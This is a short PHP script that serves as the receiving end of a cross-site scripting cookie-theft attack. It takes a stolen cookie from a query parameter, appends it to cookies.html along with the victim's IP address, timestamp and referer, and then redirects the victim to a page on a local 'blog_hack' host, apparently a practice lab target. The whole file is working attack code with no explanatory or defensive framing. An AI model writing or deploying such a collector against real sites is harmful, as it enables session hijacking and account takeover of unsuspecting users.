<?php
$cookie = $_GET['c'];
$ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");;
$referer=htmlspecialchars(getenv ('HTTP_REFERER'));
$fp = fopen('cookies.html', 'a');
fwrite($fp, 'Cookie: '.$cookie.'</br>
IP: ' .$ip. '</br>
Date and Time: ' .$date. '</br>
Referer: '.$referer.'</br></br></br>');
fclose($fp);
header ("Location: http://192.168.0.134/blog_hack/index.php?page=members&search=fred");
?>
